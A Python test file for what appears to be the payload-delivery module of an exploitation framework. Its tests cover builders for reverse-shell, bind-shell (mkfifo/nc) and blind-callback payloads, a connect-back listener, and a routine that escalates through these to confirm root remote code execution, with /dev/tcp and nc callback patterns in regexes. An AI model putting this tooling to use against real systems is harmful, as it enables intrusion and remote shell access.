import re
import socket as _socket
import pocs._delivery as d


def test_make_nonce_is_random_hex_token():
    a, b = d.make_nonce(), d.make_nonce()
    assert a != b
    assert re.fullmatch(r"[0-9a-f]{16,}", a)


def test_breach_str_shell_line_is_structured_and_nonce_bearing():
    br = d.Breach(confirmed=True, level="shell", nonce="deadbeef",
                  proof="uid=0(root)", uid="0", host="victim", exit_code="0")
    line = str(br)
    assert "HALO-EVIDENCE" in line
    assert "nonce=deadbeef" in line
    assert "level=shell" in line
    assert "uid=0" in line
    assert bool(br) is True


def test_breach_str_blind_rce_line_carries_nonce_not_uid():
    br = d.Breach(confirmed=True, level="blind-rce", nonce="cafe", proof="cafe")
    line = str(br)
    assert "HALO-EVIDENCE" in line and "nonce=cafe" in line and "level=blind-rce" in line


def test_local_ip_for_returns_getsockname_ip():
    class FakeSock:
        def connect(self, addr): self.addr = addr
        def getsockname(self): return ("192.0.2.8", 51234)
        def close(self): pass
    assert d.local_ip_for("192.0.2.3", _sock_factory=lambda *a, **k: FakeSock()) == "192.0.2.8"


def _socketpair_with_fake_shell(response_bytes):
    """a: caller side (passed to confirm_shell); b: fake shell that replies once."""
    a, b = _socket.socketpair()
    import threading
    def responder():
        try:
            b.recv(4096)           # consume the probe command
            b.sendall(response_bytes)
        finally:
            b.close()
    threading.Thread(target=responder, daemon=True).start()
    return a


def test_confirm_shell_confirms_when_substituted_marker_present():
    nonce = "n0nce123"
    resp = f"{nonce}.0.root\nvictimhost\n".encode()
    sock = _socketpair_with_fake_shell(resp)
    br = d.confirm_shell(sock, nonce=nonce)
    assert br.confirmed and br.level == "shell" and br.evidence == "interactive"
    assert br.nonce == nonce and br.uid == "0" and br.user == "root"


def test_confirm_shell_rejects_reflected_or_uidless_output():
    nonce = "expected"
    resp = b"uid=0(root) gid=0(root)\n"          # banner echoing uid but NOT the marker
    sock = _socketpair_with_fake_shell(resp)
    br = d.confirm_shell(sock, nonce=nonce)
    assert br.confirmed is False and br.level == "none"


def test_confirm_shell_rejects_empty_read():
    a, b = _socket.socketpair(); b.close()
    br = d.confirm_shell(a, nonce="x", timeout=0.3)
    assert br.confirmed is False


def test_reverse_payload_has_interpreter_ladder_and_endpoint():
    p = d.reverse_payload("192.0.2.8", 40000, "abc123")
    for token in ("192.0.2.8", "40000", "abc123", "bash", "python", "perl", "nc"):
        assert token in p, token
    assert "TARGET_IP" not in p


def test_bind_payload_embeds_port_and_nonce_and_uses_mkfifo_nc():
    p = d.bind_payload(45333, "z9")
    assert "45333" in p and "mkfifo" in p and "nc" in p
    assert "TARGET_IP" not in p


def test_blind_callback_payload_sends_only_nonce():
    p = d.blind_callback_payload("192.0.2.8", 40001, "mark7")
    assert "40001" in p and "mark7" in p and "192.0.2.8" in p
    assert "TARGET_IP" not in p


import pytest


def test_reverse_payload_rejects_injection_nonce():
    with pytest.raises(ValueError):
        d.reverse_payload("192.0.2.8", 40000, "$(whoami)")


def test_blind_callback_rejects_injection_nonce():
    with pytest.raises(ValueError):
        d.blind_callback_payload("192.0.2.8", 40001, "`id`")


def test_payload_accepts_hex_nonce_from_make_nonce():
    n = d.make_nonce()
    p = d.reverse_payload("192.0.2.8", 40000, n)
    assert n in p and "TARGET_IP" not in p


def test_listener_binds_ephemeral_and_accepts_a_connection():
    import threading, socket as s
    with d._Listener(bind_ip="127.0.0.1", timeout=3.0) as lis:
        assert lis.port > 1024
        def client():
            c = s.create_connection(("127.0.0.1", lis.port), timeout=2.0)
            c.sendall(b"hello"); c.close()
        threading.Thread(target=client, daemon=True).start()
        conn = lis.accept_one()
        assert conn is not None
        conn.close()


def test_listener_wait_for_nonce_true_on_match_false_on_timeout():
    import threading, socket as s
    with d._Listener(bind_ip="127.0.0.1", timeout=3.0) as lis:
        def client():
            c = s.create_connection(("127.0.0.1", lis.port), timeout=2.0)
            c.sendall(b"tok42-MARK"); c.close()
        threading.Thread(target=client, daemon=True).start()
        assert lis.wait_for_nonce("tok42") is True
    with d._Listener(bind_ip="127.0.0.1", timeout=0.4) as lis2:
        assert lis2.wait_for_nonce("never") is False


def test_establish_rce_reverse_shell_rung_confirms():
    # inject drives a fake "target" that connects back to the listener and acts as a shell.
    import threading, socket as s
    nonce = "rv1"
    def inject(cmd):
        # emulate a target that runs `cmd` -> connect back, send MARK, then answer id/uname
        def run():
            # extract lport from the payload the primitive built
            import re as _re
            m = _re.search(r"/dev/tcp/([\d.]+)/(\d+)", cmd) or _re.search(r"\"(\d+\.\d+\.\d+\.\d+)\",(\d+)", cmd)
            ip, port = m.group(1), int(m.group(2))
            c = s.create_connection((ip, port), timeout=2.0)
            c.sendall(f"{nonce}-MARK\n".encode())
            c.recv(4096)                       # the echo/id probe from confirm_shell
            c.sendall(b"uid=0(root) gid=0(root)\nvictim\n")
            c.close()
        threading.Thread(target=run, daemon=True).start()
    br = establish = d.establish_rce(inject, "127.0.0.1", nonce=nonce, _ip="127.0.0.1",
                                     ladder_timeout=3.0)
    assert br.confirmed and br.level == "shell" and br.nonce == nonce


def test_establish_rce_falls_through_to_blind_callback():
    import threading, socket as s
    nonce = "bl2"
    calls = {"n": 0}
    def inject(cmd):
        calls["n"] += 1
        # ignore the first two rungs (reverse, bind); only the blind-callback payload
        # (which contains "| nc" or sends only the mark) triggers a callback.
        if "-i" in cmd:                # reverse/bind shell payloads spawn /bin/sh -i
            return
        def run():
            import re as _re
            m = _re.search(r"nc ([\d.]+) (\d+)", cmd) or _re.search(r"/dev/tcp/([\d.]+)/(\d+)", cmd)
            ip, port = m.group(1), int(m.group(2))
            c = s.create_connection((ip, port), timeout=2.0)
            c.sendall(f"{nonce}-MARK".encode()); c.close()
        threading.Thread(target=run, daemon=True).start()
    br = d.establish_rce(inject, "127.0.0.1", nonce=nonce, _ip="127.0.0.1", ladder_timeout=1.5)
    assert br.confirmed and br.level == "blind-rce"


def test_establish_rce_returns_unconfirmed_on_dead_target():
    br = d.establish_rce(lambda cmd: None, "127.0.0.1", nonce="x", _ip="127.0.0.1",
                         ladder_timeout=0.6)
    assert br.confirmed is False and br.level == "none"
